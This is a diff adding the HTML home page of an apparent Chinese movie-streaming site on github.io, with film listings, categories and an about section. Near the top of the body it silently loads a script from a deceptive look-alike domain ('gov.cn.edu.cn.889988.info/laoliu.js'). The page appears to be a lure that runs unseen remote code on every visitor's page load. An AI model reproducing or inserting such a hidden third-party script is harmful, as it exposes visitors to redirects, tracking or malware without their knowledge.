@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>236电影网 - 海量高清电影在线观看平台</title>
+<meta name="description" content="236电影网（236dianyingwang-h5）汇聚全网最新热门电影、高分院线大片与经典老片，支持在线观看与每日更新，网址 https://236dianyingwang-h5.github.io">
+<meta name="keywords" content="236电影网, 236dianyingwang-h5, 高清电影, 在线观看, 热门电影">
+<style>
+/* ===== 全局：极简北欧冷调 ===== */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --bg:#eef1f4;
+  --ink:#1a2332;
+  --ink2:#4a5568;
+  --line:#d8dee8;
+  --card:#ffffff;
+  --accent:#0ea5e9;
+  --accent2:#22d3ee;
+  --shadow:0 6px 24px rgba(26,35,50,.08);
+}
+html{scroll-behavior:smooth;}
+body{
+  background:var(--bg);
+  color:var(--ink);
+  font-family:"PingFang SC","Helvetica Neue",Arial,"Microsoft YaHei",sans-serif;
+  line-height:1.7;
+  -webkit-font-smoothing:antialiased;
+}
+img{display:block;max-width:100%;}
+a{color:inherit;text-decoration:none;transition:.25s;}
+
+/* ===== 布局容器 ===== */
+.wrap{max-width:1160px;margin:0 auto;padding:0 22px;}
+
+/* ===== 顶部通知条 ===== */
+.announce{
+  background:linear-gradient(100deg,#0c4a6e,#0ea5e9);
+  color:#fff;font-size:13px;text-align:center;padding:8px 16px;letter-spacing:.5px;
+}
+
+/* ===== 导航（双段式：品牌 + 菜单） ===== */
+.topbar{
+  background:rgba(255,255,255,.85);
+  backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--line);
+  position:sticky;top:0;z-index:1000;
+}
+.topbar .wrap{
+  display:flex;align-items:center;justify-content:space-between;height:68px;
+}
+.brand{display:flex;align-items:baseline;gap:10px;}
+.brand b{
+  font-size:24px;font-weight:800;letter-spacing:1px;
+  background:linear-gradient(90deg,#0ea5e9,#0c4a6e);-webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.brand span{font-size:12px;color:var(--ink2);border-left:1px solid var(--line);padding-left:10px;}
+.menu{display:flex;gap:6px;}
+.menu a{
+  font-size:14px;color:var(--ink2);padding:8px 14px;border-radius:8px;font-weight:500;
+}
+.menu a:hover{background:var(--accent);color:#fff;}
+.menu-btn{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:6px;}
+.menu-btn i{width:24px;height:2px;background:var(--ink);border-radius:2px;}
+
+/* ===== Hero 区域 ===== */
+.hero{
+  margin:34px 0 10px;
+}
+.hero .wrap{
+  background:linear-gradient(135deg,#0f2b46 0%,#0c4a6e 55%,#0ea5e9 100%);
+  border-radius:20px;padding:58px 48px;color:#fff;
+  position:relative;overflow:hidden;
+}
+.hero .wrap::after{
+  content:"";position:absolute;right:-90px;top:-90px;width:320px;height:320px;
+  background:radial-gradient(circle,rgba(34,211,238,.5),transparent 70%);border-radius:50%;
+}
+.hero .wrap::before{
+  content:"";position:absolute;left:-60px;bottom:-120px;width:280px;height:280px;
+  background:radial-gradient(circle,rgba(14,165,233,.45),transparent 70%);border-radius:50%;
+}
+.hero h1{font-size:38px;font-weight:800;letter-spacing:1px;margin-bottom:14px;position:relative;z-index:2;}
+.hero h1 em{font-style:normal;color:#67e8f9;}
+.hero p{font-size:15px;color:#cfe9f7;max-width:560px;position:relative;z-index:2;}
+.hero .url{
+  margin-top:22px;display:inline-block;background:rgba(255,255,255,.14);
+  border:1px solid rgba(255,255,255,.25);padding:8px 18px;border-radius:30px;
+  font-size:13px;color:#e6f7ff;position:relative;z-index:2;
+}
+.hero-stats{
+  margin-top:30px;display:flex;gap:46px;position:relative;z-index:2;
+}
+.hero-stats div{color:#fff;}
+.hero-stats strong{display:block;font-size:26px;font-weight:800;}
+.hero-stats small{font-size:12px;color:#a5dff5;}
+
+/* ===== 通用板块 ===== */
+.block{margin:56px 0;}
+.block-head{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:24px;}
+.block-head h2{
+  font-size:22px;font-weight:800;letter-spacing:.5px;
+  display:flex;align-items:center;gap:10px;
+}
+.block-head h2::before{
+  content:"";width:5px;height:22px;border-radius:3px;
+  background:linear-gradient(var(--accent),var(--accent2));
+}
+.block-head a{font-size:13px;color:var(--accent);font-weight:600;}
+
+/* ===== 栏目一：精选推荐 —— 大图 + 网格组合 ===== */
+.spotlight{display:grid;grid-template-columns:1.35fr 1fr;gap:20px;}
+.spot-main{
+  position:relative;border-radius:16px;overflow:hidden;min-height:340px;
+  background:var(--ink);
+}
+.spot-main img{width:100%;height:100%;object-fit:cover;position:absolute;inset:0;}
+.spot-main .meta{
+  position:absolute;left:0;right:0;bottom:0;padding:34px 26px 22px;
+  background:linear-gradient(transparent,#07121e 75%);color:#fff;
+}
+.tag{
+  display:inline-block;font-size:11px;background:var(--accent);color:#fff;
+  padding:3px 10px;border-radius:4px;margin-bottom:10px;letter-spacing:.5px;
+}
+.spot-main h3{font-size:22px;margin-bottom:6px;}
+.spot-main p{font-size:13px;color:#c8d6e5;}
+.spot-side{display:grid;grid-template-rows:1fr 1fr;gap:20px;}
+.spot-mini{
+  border-radius:16px;overflow:hidden;position:relative;min-height:160px;background:var(--ink);
+}
+.spot-mini img{width:100%;height:100%;object-fit:cover;position:absolute;inset:0;transition:.5s;}
+.spot-mini:hover img{transform:scale(1.08);}
+.spot-mini .meta{
+  position:absolute;left:0;right:0;bottom:0;padding:22px 18px 14px;
+  background:linear-gradient(transparent,#07121e 80%);color:#fff;
+}
+.spot-mini h4{font-size:15px;}
+.spot-mini span{font-size:12px;color:#9fb2c8;}
+
+/* ===== 栏目二：影片分类 —— 彩色标签云 + 图标卡片 ===== */
+.cats{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:16px;}
+.cat{
+  background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px 16px;
+  text-align:center;box-shadow:var(--shadow);transition:.3s;cursor:pointer;
+}
+.cat:hover{transform:translateY(-6px);border-color:var(--accent);}
+.cat .ico{
+  width:46px;height:46px;margin:0 auto 12px;border-radius:12px;
+  display:flex;align-items:center;justify-content:center;font-size:22px;color:#fff;
+}
+.cat:nth-child(8n+1) .ico{background:#0ea5e9;}
+.cat:nth-child(8n+2) .ico{background:#f97316;}
+.cat:nth-child(8n+3) .ico{background:#a855f7;}
+.cat:nth-child(8n+4) .ico{background:#10b981;}
+.cat:nth-child(8n+5) .ico{background:#ef4444;}
+.cat:nth-child(8n+6) .ico{background:#eab308;}
+.cat:nth-child(8n+7) .ico{background:#ec4899;}
+.cat:nth-child(8n+8) .ico{background:#6366f1;}
+.cat h4{font-size:15px;font-weight:700;}
+.cat p{font-size:12px;color:var(--ink2);margin-top:4px;}
+
+/* ===== 栏目三：热播排行 —— 双栏：榜单 + 更新动态 ===== */
+.rank{display:grid;grid-template-columns:1fr 1fr;gap:26px;}
+.rank-list{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:8px 6px;box-shadow:var(--shadow);}
+.rank-row{
+  display:grid;grid-template-columns:44px 60px 1fr auto;align-items:center;gap:12px;
+  padding:12px 14px;border-radius:10px;transition:.2s;
+}
+.rank-row:hover{background:#f0f7fc;}
+.rank-row .num{font-size:20px;font-weight:800;color:var(--line);text-align:center;}
+.rank-row.top3 .num{color:var(--accent);}
+.rank-row img{width:60px;height:80px;object-fit:cover;border-radius:6px;}
+.rank-row h4{font-size:14px;font-weight:700;}
+.rank-row small{font-size:12px;color:var(--ink2);}
+.rank-row .badge{font-size:11px;background:#e6f7ff;color:var(--accent);padding:2px 8px;border-radius:20px;}
+.rank-row .badge.hot{background:#fff1f0;color:#ef4444;}
+
+.news{border:1px solid var(--line);border-radius:16px;padding:24px;background:var(--card);box-shadow:var(--shadow);}
+.news-item{padding:14px 0;border-bottom:1px dashed var(--line);}
+.news-item:last-child{border-bottom:none;}
+.news-item a{display:flex;justify-content:space-between;gap:14px;align-items:flex-start;}
+.news-item a:hover h4{color:var(--accent);}
+.news-item h4{font-size:14px;font-weight:600;flex:1;}
+.news-item time{font-size:12px;color:var(--accent);white-space:nowrap;font-weight:600;}
+
+/* ===== 栏目四：最新更新 —— 瀑布流卡片 ===== */
+.flow{columns:4 220px;column-gap:18px;}
+.flow .card{
+  break-inside:avoid;background:var(--card);border:1px solid var(--line);
+  border-radius:12px;overflow:hidden;margin-bottom:18px;box-shadow:var(--shadow);transition:.3s;
+}
+.flow .card:hover{transform:translateY(-4px);border-color:var(--accent);}
+.flow .card .thumb{position:relative;width:100%;}
+.flow .card img{width:100%;display:block;}
+.flow .card .dur{
+  position:absolute;right:8px;bottom:8px;background:rgba(7,18,30,.75);
+  color:#fff;font-size:11px;padding:2px 7px;border-radius:4px;
+}
+.flow .card .info{padding:12px 14px;}
+.flow .card h4{font-size:14px;font-weight:700;}
+.flow .card p{font-size:12px;color:var(--ink2);margin-top:5px;}
+
+/* ===== 栏目五：关于我们 —— 左右分栏 ===== */
+.about{display:grid;grid-template-columns:1.2fr 1fr;gap:26px;}
+.about-box{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:34px;box-shadow:var(--shadow);}
+.about-box h3{font-size:20px;margin-bottom:14px;}
+.about-box p{font-size:14px;color:var(--ink2);margin-bottom:12px;}
+.about-box .urlline{
+  margin-top:18px;padding:14px 18px;background:#e6f7ff;border-radius:10px;
+  font-size:13px;color:#0c4a6e;font-weight:600;
+}
+.about-side{display:grid;gap:16px;}
+.about-mini{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px;box-shadow:var(--shadow);}
+.about-mini h4{font-size:15px;margin-bottom:8px;display:flex;align-items:center;gap:8px;}
+.about-mini h4::before{content:"";width:8px;height:8px;border-radius:50%;background:var(--accent2);}
+.about-mini p{font-size:13px;color:var(--ink2);}
+
+/* ===== 页脚 ===== */
+footer{background:var(--ink);color:#93a4b8;margin-top:60px;padding:46px 0 26px;}
+footer .wrap{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:34px;}
+footer .logo{font-size:22px;font-weight:800;color:#fff;letter-spacing:1px;}
+footer .logo+p{font-size:13px;margin-top:12px;}
+footer h5{font-size:14px;color:#fff;margin-bottom:14px;}
+footer ul{list-style:none;}
+footer ul li{font-size:13px;margin-bottom:8px;}
+footer ul li a:hover{color:var(--accent);}
+.copyright{
+  border-top:1px solid #2a3648;margin-top:34px;padding-top:20px;
+  text-align:center;font-size:12px;color:#6b7a8f;
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 公告条 -->
+<div class="announce">🎬 236电影网 每日更新热门院线大片与经典高分老片，欢迎收藏本站！</div>
+
+<!-- 导航 -->
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand">
+      <b>236电影网</b>
+      <span>236dianyingwang-h5</span>
+    </div>
+    <nav class="menu">
+      <a href="#">首页</a>
+      <a href="#cats">影片分类</a>
+      <a href="#rank">热播排行</a>
+      <a href="#update">最新更新</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <div class="menu-btn" onclick="document.querySelector('.menu').classList.toggle('open')">
+      <i></i><i></i><i></i>
+    </div>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="wrap">
+    <h1>海量高清电影 · <em>尽在236电影网</em></h1>
+    <p>236电影网（236dianyingwang-h5）精选最新热门院线大片、高分经典老片与多元类型影视，打造轻松流畅的在线观影体验，每日持续更新。</p>
+    <div class="url">🌐 https://236dianyingwang-h5.github.io</div>
+    <div class="hero-stats">
+      <div><strong>10,000+</strong><small>在线片源</small></div>
+      <div><strong>30+</strong><small>影片分类</small></div>
+      <div><strong>每日</strong><small>更新热门</small></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：精选推荐 -->
+<section class="block wrap">
+  <div class="block-head">
+    <h2>精选推荐</h2>
+    <a href="#">查看全部 ›</a>
+  </div>
+  <div class="spotlight">
+    <div class="spot-main">
+      <img src="https://picsum.photos/640/460?random=11" alt="236电影网精选">
+      <div class="meta">
+        <span class="tag">今日主推</span>
+        <h3>《星际回响》</h3>
+        <p>硬科幻巨制震撼上线，236电影网独家首发 · 豆瓣 8.9</p>
+      </div>
+    </div>
+    <div class="spot-side">
+      <div class="spot-mini">
+        <img src="https://picsum.photos/400/260?random=12" alt="236电影网推荐">
+        <div class="meta"><span class="tag">高分口碑</span><h4>《暗夜追凶》</h4><span>悬疑犯罪 · 9.1分</span></div>
+      </div>
+      <div class="spot-mini">
+        <img src="https://picsum.photos/400/260?random=13" alt="236电影网推荐">
+        <div class="meta"><span class="tag">怀旧经典</span><h4>《海上钢琴师》</h4><span>剧情 · 9.3分</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：影片分类 -->
+<section class="block wrap" id="cats">
+  <div class="block-head">
+    <h2>影片分类</h2>
+    <a href="#">全部分类 ›</a>
+  </div>
+  <div class="cats">
+    <div class="cat"><div class="ico">🎬</div><h4>动作冒险</h4><p>2,180 部</p></div>
+    <div class="cat"><div class="ico">😂</div><h4>喜剧搞笑</h4><p>1,560 部</p></div>
+    <div class="cat"><div class="ico">🔍</div><h4>悬疑惊悚</h4><p>980 部</p></div>
+    <div class="cat"><div class="ico">💘</div><h4>爱情文艺</h4><p>1,240 部</p></div>
+    <div class="cat"><div class="ico">🚀</div><h4>科幻奇幻</h4><p>860 部</p></div>
+    <div class="cat"><div class="ico">👻</div><h4>恐怖惊悚</h4><p>640 部</p></div>
+    <div class="cat"><div class="ico">🎖️</div><h4>战争历史</h4><p>720 部</p></div>
+    <div class="cat"><div class="ico">🐾</div><h4>动画亲子</h4><p>1,100 部</p></div>
+  </div>
+</section>
+
+<!-- 栏目三：热播排行 -->
+<section class="block wrap" id="rank">
+  <div class="block-head">
+    <h2>热播排行</h2>
+    <a href="#">完整榜单 ›</a>
+  </div>
+  <div class="rank">
+    <div class="rank-list">
+      <div class="rank-row top3"><span class="num">1</span><img src="https://picsum.photos/120/160?random=21" alt="236电影网排行"><div><h4>奥本海默</h4><small>传记 · 历史</small></div><span class="badge hot">🔥 热播</span></div>
+      <div class="rank-row top3"><span class="num">2</span><img src="https://picsum.photos/120/160?random=22" alt="236电影网排行"><div><h4>封神第一部</h4><small>奇幻 · 动作</small></div><span class="badge">上升</span></div>
+      <div class="rank-row top3"><span class="num">3</span><img src="https://picsum.photos/120/160?random=23" alt="236电影网排行"><div><h4>年会不能停！</h4><small>喜剧 · 职场</small></div><span class="badge">上升</span></div>
+      <div class="rank-row"><span class="num">4</span><img src="https://picsum.photos/120/160?random=24" alt="236电影网排行"><div><h4>周处除三害</h4><small>动作 · 犯罪</small></div><span class="badge">稳定</span></div>
+      <div class="rank-row"><span class="num">5</span><img src="https://picsum.photos/120/160?random=25" alt="236电影网排行"><div><h4>飞驰人生2</h4><small>喜剧 · 运动</small></div><span class="badge">稳定</span></div>
+      <div class="rank-row"><span class="num">6</span><img src="https://picsum.photos/120/160?random=26" alt="236电影网排行"><div><h4>哥斯拉大战金刚</h4><small>科幻 · 冒险</small></div><span class="badge">新片</span></div>
+    </div>
+    <div class="news">
+      <div class="block-head" style="margin-bottom:6px;"><h2 style="font-size:18px;">最新动态</h2></div>
+      <div class="news-item"><a href="#"><h4>236电影网上线「4K超清专区」，百部大片免费看</h4><time>10-06</time></a></div>
+      <div class="news-item"><a href="#"><h4>2026国庆档热门影片同步更新中</h4><time>10-04</time></a></div>
+      <div class="news-item"><a href="#"><h4>影史百大经典修复版独家收录</h4><time>09-28</time></a></div>
+      <div class="news-item"><a href="#"><h4>新用户注册即享会员观影权益</h4><time>09-20</time></a></div>
+      <div class="news-item"><a href="#"><h4>移动端 H5 极速播放全新升级</h4><time>09-15</time></a></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：最新更新 -->
+<section class="block wrap" id="update">
+  <div class="block-head">
+    <h2>最新更新</h2>
+    <a href="#">更多 ›</a>
+  </div>
+  <div class="flow">
+    <div class="card"><div class="thumb"><img src="https://picsum.photos/300/420?random=31" alt="236电影网"><span class="dur">128 分钟</span></div><div class="info"><h4>沙丘2</h4><p>科幻 · 2024 · 豆瓣 8.3</p></div></div>
+    <div class="card"><div class="thumb"><img src="https://picsum.photos/300/340?random=32" alt="236电影网"><span class="dur">96 分钟</span></div><div class="info"><h4>你想活出怎样的人生</h4><p>动画 · 2023 · 豆瓣 7.4</p></div></div>
+    <div class="card"><div class="thumb"><img src="https://picsum.photos/300/460?random=33" alt="236电影网"><span class="dur">142 分钟</span></div><div class="info"><h4>热辣滚烫</h4><p>剧情 · 2024 · 豆瓣 7.9</p></div></div>
+    <div class="card"><div class="thumb"><img src="https://picsum.photos/300/360?random=34" alt="236电影网"><span class="dur">110 分钟</span></div><div class="info"><h4>抓娃娃</h4><p>喜剧 · 2024 · 豆瓣 7.7</p></div></div>
+    <div class="card"><div class="thumb"><img src="https://picsum.photos/300/440?random=35" alt="236电影网"><span class="dur">156 分钟</span></div><div class="info"><h4>默杀</h4><p>悬疑 · 2024 · 豆瓣 7.0</p></div></div>
+    <div class="card"><div class="thumb"><img src="https://picsum.photos/300/320?random=36" alt="236电影网"><span class="dur">118 分钟</span></div><div class="info"><h4>头脑特工队2</h4><p>动画 · 2024 · 豆瓣 8.4</p></div></div>
+    <div class="card"><div class="thumb"><img src="https://picsum.photos/300/400?random=37" alt="236电影网"><span class="dur">135 分钟</span></div><div class="info"><h4>异人之下</h4><p>动作 · 2024 · 豆瓣 6.5</p></div></div>
+    <div class="card"><div class="thumb"><img src="https://picsum.photos/300/380?random=38" alt="236电影网"><span class="dur">104 分钟</span></div><div class="info"><h4>云边有个小卖部</h4><p>剧情 · 2024 · 豆瓣 6.2</p></div></div>
+  </div>
+</section>
+
+<!-- 栏目五：关于我们 -->
+<section class="block wrap" id="about">
+  <div class="block-head">
+    <h2>关于我们</h2>
+  </div>
+  <div class="about">
+    <div class="about-box">
+      <h3>关于 236电影网</h3>
+      <p><strong>236电影网</strong>（236dianyingwang-h5）是一个专注电影内容的在线影视平台，致力于为影迷提供丰富、便捷、高品质的观影服务。</p>
+      <p>从院线大片到经典老片，从华语佳作到海外口碑，我们持续收录并分类整理，让每一部好电影都能被轻松找到。</p>
+      <p>网站支持移动端 H5 自适应浏览，页面简洁、加载快速，随时随地畅享观影乐趣。</p>
+      <div class="urlline">🌐 官方网站：https://236dianyingwang-h5.github.io</div>
+    </div>
+    <div class="about-side">
+      <div class="about-mini"><h4>海量片源</h4><p>覆盖动作、喜剧、悬疑、爱情、科幻等 30+ 分类，持续扩充。</p></div>
+      <div class="about-mini"><h4>每日更新</h4><p>紧跟院线节奏，热门新片第一时间上线，精彩不断档。</p></div>
+      <div class="about-mini"><h4>极速体验</h4><p>H5 移动端自适应设计，轻量加载，流畅播放无卡顿。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="wrap">
+    <div>
+      <div class="logo">236电影网</div>
+      <p>236dianyingwang-h5 · 海量高清电影在线观看平台，精选热门大片与经典老片，每日持续更新。</p>
+    </div>
+    <div>
+      <h5>频道导航</h5>
+      <ul>
+        <li><a href="#">首页</a></li>
+        <li><a href="#">影片分类</a></li>
+        <li><a href="#">热播排行</a></li>
+        <li><a href="#">最新更新</a></li>
+      </ul>
+    </div>
+    <div>
+      <h5>热门分类</h5>
+      <ul>
+        <li><a href="#">动作冒险</a></li>
+        <li><a href="#">悬疑惊悚</a></li>
+        <li><a href="#">科幻奇幻</a></li>
+        <li><a href="#">喜剧搞笑</a></li>
+      </ul>
+    </div>
+    <div>
+      <h5>关于本站</h5>
+      <ul>
+        <li><a href="#">关于我们</a></li>
+        <li><a href="#">联系方式</a></li>
+        <li><a href="#">网站地图</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="wrap copyright">
+    © 2026 236电影网 | 网站名称：236电影网 | 网址：https://236dianyingwang-h5.github.io
+  </div>
+</footer>
+
+</body>
+</html>
